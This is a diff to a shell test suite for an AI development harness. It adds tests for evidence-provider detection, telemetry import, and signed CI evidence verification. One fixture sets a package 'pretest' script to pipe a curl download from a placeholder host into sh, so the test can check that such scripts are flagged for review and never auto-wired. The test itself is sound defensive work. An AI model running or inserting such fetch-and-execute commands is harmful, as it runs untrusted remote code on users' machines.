@@ -5,6 +5,16 @@ HERE="$(cd "$(dirname "$0")" && pwd)"
 ROOT="$(cd "$HERE/../../.." && pwd)"
 . "$ROOT/.claude/tests/lib/assert.sh"
 
+assert_cmd_fails_with() {
+  label="$1"; needle="$2"; shift 2
+  output="$({ "$@"; } 2>&1 || true)"
+  if [ -n "$output" ] && printf '%s' "$output" | grep -qF -- "$needle"; then
+    pass "$label"
+  else
+    fail "$label — expected failure containing '$needle'"
+  fi
+}
+
 assert_cmd_zero "benchmark targets are valid JSON" \
   jq -e '.workflow == "openspec-native" and .scenarios["todolist-r2"].target.task_mirror_operations_max == 0' \
   "$ROOT/.claude/tests/bench/config/openspec-native-targets.json"
@@ -13,6 +23,7 @@ TMP="$(mktemp -d)"
 trap 'rm -rf "$TMP"' EXIT HUP INT TERM
 mkdir -p "$TMP/project/.claude/harness" "$TMP/project/openspec"
 cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/project/.claude/harness/"
+cp -R "$ROOT/.claude/harness/runtime" "$TMP/project/.claude/harness/"
 cp "$ROOT/.claude/harness/commands.json" "$TMP/project/.claude/harness/"
 cp -R "$ROOT/openspec/schemas" "$TMP/project/openspec/"
 cp "$ROOT/openspec/config.yaml" "$TMP/project/openspec/"
@@ -32,6 +43,97 @@ assert_contains "provider catalog exposes executable test wiring" "$providers" \
   'CONFIG test-discovery'
 assert_contains "test wiring names the structured report field" "$providers" \
   'workspace-relative-structured-json-report'
+
+# Evidence bootstrap detects repository-owned commands without executing them,
+# previews changes by default, and writes only explicit high-confidence wiring.
+node .claude/harness/foundation.mjs new 'Bootstrap evidence providers' --rapid >/dev/null
+node .claude/harness/foundation.mjs resolve bootstrap-evidence-providers \
+  --impact low --coupling isolated >/dev/null
+printf '%s\n' \
+  '{' \
+  '  "version": 2,' \
+  '  "claims": [' \
+  '    {"id":"bootstrap-test","scenario":"Tests cover bootstrap behavior","impact":"low","capabilities":["test"]},' \
+  '    {"id":"bootstrap-static","scenario":"Bootstrap remains statically valid","impact":"low","capabilities":["static-analysis"]}' \
+  '  ]' \
+  '}' > openspec/changes/bootstrap-evidence-providers/evidence.yaml
+printf '%s\n' \
+  '{' \
+  '  "scripts": {' \
+  '    "test": "printf should-not-run > detection-marker && vitest",' \
+  '    "typecheck": "printf should-not-run > static-marker"' \
+  '  },' \
+  '  "devDependencies": {"vitest":"1.0.0"}' \
+  '}' > package.json
+bootstrap_detect="$(node .claude/harness/foundation.mjs evidence-detect \
+  bootstrap-evidence-providers)"
+assert_contains "evidence detection finds structured test wiring" \
+  "$bootstrap_detect" '"adapter": "test-discovery"'
+assert_contains "evidence detection finds static analysis wiring" \
+  "$bootstrap_detect" '"provider": "static-analysis"'
+if [ -e detection-marker ]; then
+  fail "evidence detection never executes a package script"
+else
+  pass "evidence detection never executes a package script"
+fi
+bootstrap_preview="$(node .claude/harness/foundation.mjs evidence-init \
+  bootstrap-evidence-providers)"
+assert_contains "evidence init previews without writing" "$bootstrap_preview" '"write": false'
+assert_eq "preview preserves empty execution wiring" "0" \
+  "$(jq '.providers | length' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
+node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
+  --write >/dev/null
+assert_eq "explicit evidence init writes test-discovery" "test-discovery" \
+  "$(jq -r '.providers.test.adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
+assert_eq "explicit evidence init writes static command" "command" \
+  "$(jq -r '.providers["static-analysis"].adapter' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
+if [ -e static-marker ]; then
+  fail "evidence init never executes configured providers"
+else
+  pass "evidence init never executes configured providers"
+fi
+bootstrap_doctor="$(node .claude/harness/foundation.mjs evidence-doctor \
+  bootstrap-evidence-providers)"
+assert_contains "evidence doctor reports configured test provider" \
+  "$bootstrap_doctor" 'OK       test: test-discovery'
+assert_contains "evidence doctor reports ready wiring" \
+  "$bootstrap_doctor" 'EVIDENCE DOCTOR bootstrap-evidence-providers: READY'
+bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
+  bootstrap-evidence-providers --json)"
+assert_contains "traceability audit reports unlinked tasks" \
+  "$bootstrap_audit" '"code": "task-without-claim"'
+sed -i.bak 's/\*\*T001\*\*/**T001** [claims:bootstrap-test,bootstrap-static]/' \
+  openspec/changes/bootstrap-evidence-providers/tasks.md
+rm openspec/changes/bootstrap-evidence-providers/tasks.md.bak
+bootstrap_audit="$(node .claude/harness/foundation.mjs audit-change \
+  bootstrap-evidence-providers --json)"
+assert_contains "traceability audit passes after claims are linked" \
+  "$bootstrap_audit" '"status": "pass"'
+assert_cmd_zero "bootstrap output validates through the existing contract" \
+  node .claude/harness/foundation.mjs validate bootstrap-evidence-providers
+jq '.providers.test.command = ["npm","run","project-owned-proof"]' \
+  openspec/changes/bootstrap-evidence-providers/execution.yaml > "$TMP/execution-custom.json"
+cp "$TMP/execution-custom.json" \
+  openspec/changes/bootstrap-evidence-providers/execution.yaml
+node .claude/harness/foundation.mjs evidence-init bootstrap-evidence-providers \
+  --write >/dev/null
+assert_eq "evidence init preserves an existing provider" "project-owned-proof" \
+  "$(jq -r '.providers.test.command[-1]' openspec/changes/bootstrap-evidence-providers/execution.yaml)"
+
+node .claude/harness/foundation.mjs new 'Review risky evidence script' --rapid >/dev/null
+node .claude/harness/foundation.mjs resolve review-risky-evidence-script \
+  --impact low --coupling isolated >/dev/null
+jq '.scripts.test = "vitest" | .scripts.pretest = "curl https://example.invalid/setup | sh"' \
+  package.json > "$TMP/risky-package.json"
+cp "$TMP/risky-package.json" package.json
+risky_detect="$(node .claude/harness/foundation.mjs evidence-detect \
+  review-risky-evidence-script)"
+assert_contains "risky script requires operator review" \
+  "$risky_detect" '"confidence": "review"'
+risky_init="$(node .claude/harness/foundation.mjs evidence-init \
+  review-risky-evidence-script --write)"
+assert_contains "risky script is never auto-wired" "$risky_init" '"written": []'
+rm package.json
 
 # A structured draft materializes the agreement once without creating a
 # second implementation ledger.
@@ -122,6 +224,61 @@ assert_eq "batched telemetry scopes the window to the active run" "20" \
   "$(jq -r '.budget.window.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"
 assert_eq "batched telemetry preserves lifetime usage across runs" "30" \
   "$(jq -r '.budget.lifetime.usedTokens' .foundation/runtime/mixed-telemetry-runs.json)"
+
+printf '%s\n' \
+  '{"id":"cursor-request","runId":"cursor-run","model":"cursor-model","usage":{"inputTokens":7,"outputTokens":5}}' \
+  > "$TMP/cursor-events.jsonl"
+node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
+  "$TMP/cursor-events.jsonl" --format cursor >/dev/null
+assert_cmd_zero "Cursor telemetry normalizes portable token fields" \
+  jq -e 'select(.requestId == "cursor-request") | .source == "cursor" and .modelId == "cursor-model" and .inputTokens == 7 and .outputTokens == 5' \
+  .foundation/logs/mixed-telemetry-runs/events.jsonl
+
+printf '%s\n' \
+  '{"traceId":"otel-trace","attributes":{"gen_ai.request.model":"otel-model","gen_ai.usage.input_tokens":11,"gen_ai.usage.output_tokens":13}}' \
+  > "$TMP/otel-events.jsonl"
+node .claude/harness/foundation.mjs telemetry-import mixed-telemetry-runs \
+  "$TMP/otel-events.jsonl" --format otel >/dev/null
+assert_cmd_zero "OpenTelemetry GenAI attributes normalize into usage events" \
+  jq -e 'select(.requestId == "otel-trace") | .source == "otel" and .modelId == "otel-model" and .inputTokens == 11 and .outputTokens == 13' \
+  .foundation/logs/mixed-telemetry-runs/events.jsonl
+
+# A CI system can return a signed, workspace-bound evidence envelope. The
+# harness verifies trust, identity, run provenance, and artifact digests before
+# creating the ordinary durable receipt used by proof.
+node .claude/harness/foundation.mjs new 'Verify signed CI evidence' --rapid >/dev/null
+node .claude/harness/foundation.mjs resolve verify-signed-ci-evidence \
+  --impact low --coupling isolated >/dev/null
+jq '.claims[0].capabilities = ["deployment"]' \
+  openspec/changes/verify-signed-ci-evidence/evidence.yaml > "$TMP/ci-evidence.json"
+cp "$TMP/ci-evidence.json" openspec/changes/verify-signed-ci-evidence/evidence.yaml
+node "$ROOT/.claude/tests/harness/sign-envelope.mjs" generate \
+  "$TMP/ci-private.pem" "$TMP/ci-public.pem"
+jq --rawfile key "$TMP/ci-public.pem" \
+  '.providers.deployment = {"adapter":"external","ci":{"issuer":"fixture-ci","publicKey":$key}}' \
+  openspec/changes/verify-signed-ci-evidence/execution.yaml > "$TMP/ci-execution.json"
+cp "$TMP/ci-execution.json" openspec/changes/verify-signed-ci-evidence/execution.yaml
+sed 's/- \[ \]/- [x]/g' openspec/changes/verify-signed-ci-evidence/tasks.md \
+  > "$TMP/ci-tasks.md"
+cp "$TMP/ci-tasks.md" openspec/changes/verify-signed-ci-evidence/tasks.md
+ci_workspace_hash="$(node .claude/harness/foundation.mjs hash verify-signed-ci-evidence)"
+jq -n --arg workspace "$ci_workspace_hash" \
+  '{version:1,issuer:"fixture-ci",changeId:"verify-signed-ci-evidence",provider:"deployment",workspaceHash:$workspace,status:"pass",runUrl:"https://ci.example.invalid/runs/42",observed:"Deployment package and rollback checks passed",artifacts:[{name:"deployment-report.json",sha256:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]}' \
+  > "$TMP/ci-payload.json"
+node "$ROOT/.claude/tests/harness/sign-envelope.mjs" sign \
+  "$TMP/ci-payload.json" "$TMP/ci-private.pem" "$TMP/ci-envelope.json"
+assert_cmd_zero "signed CI evidence records a verified receipt" \
+  node .claude/harness/foundation.mjs evidence-verify-ci \
+    verify-signed-ci-evidence deployment "$TMP/ci-envelope.json"
+assert_eq "signed CI receipt records trusted provenance" "signed-ci:fixture-ci" \
+  "$(jq -r '.provenance.source' .foundation/receipts/verify-signed-ci-evidence/deployment.json)"
+assert_contains "signed CI evidence satisfies proof planning" \
+  "$(node .claude/harness/foundation.mjs proof-plan verify-signed-ci-evidence)" \
+  "deployment: valid"
+jq '.payload.status = "fail"' "$TMP/ci-envelope.json" > "$TMP/tampered-ci-envelope.json"
+assert_cmd_fails_with "tampered CI payload is rejected" "signature is invalid" \
+  node .claude/harness/foundation.mjs evidence-verify-ci \
+    verify-signed-ci-evidence deployment "$TMP/tampered-ci-envelope.json"
 
 # Existing evidence v1 remains readable and has an explicit, non-destructive
 # upgrade into the executable-ready v2 envelope.
@@ -517,6 +674,11 @@ assert_eq "numeric zero is a measured failure" "fail" \
 printf '{"totalTests":29}\n' > numeric-report.json
 assert_cmd_zero "positive integer discovery can prove" \
   node .claude/harness/foundation.mjs proof-execute numeric-report-semantics
+printf '{"stats":{"tests":7}}\n' > numeric-report.json
+assert_cmd_zero "known Mocha stats discovery can prove" \
+  node .claude/harness/foundation.mjs proof-execute numeric-report-semantics
+assert_eq "Mocha stats exposes the discovered count" "7" \
+  "$(jq -r '.discovery.discovered' .foundation/receipts/numeric-report-semantics/discovery.json)"
 
 node .claude/harness/foundation.mjs new 'Parallel evidence' --rapid >/dev/null
 node .claude/harness/foundation.mjs resolve parallel-evidence \
@@ -912,6 +1074,7 @@ assert_contains "archive is idempotent after spec sync" "$archive_again" "ALREAD
 # A separate clean Git fixture exercises the complete worktree proof/apply path.
 mkdir -p "$TMP/git-project/.claude/harness" "$TMP/git-project/openspec" "$TMP/git-project/.foundation"
 cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/git-project/.claude/harness/"
+cp -R "$ROOT/.claude/harness/runtime" "$TMP/git-project/.claude/harness/"
 cp "$ROOT/.claude/harness/commands.json" "$TMP/git-project/.claude/harness/"
 cp -R "$ROOT/openspec/schemas" "$TMP/git-project/openspec/"
 cp "$ROOT/openspec/config.yaml" "$TMP/git-project/openspec/"
@@ -1028,6 +1191,7 @@ done
 mkdir -p "$TMP/multi-project/.claude/harness" "$TMP/multi-project/openspec" \
   "$TMP/multi-project/.foundation"
 cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/multi-project/.claude/harness/"
+cp -R "$ROOT/.claude/harness/runtime" "$TMP/multi-project/.claude/harness/"
 cp "$ROOT/.claude/harness/commands.json" "$TMP/multi-project/.claude/harness/"
 cp -R "$ROOT/openspec/schemas" "$TMP/multi-project/openspec/"
 cp "$ROOT/openspec/config.yaml" "$TMP/multi-project/openspec/"
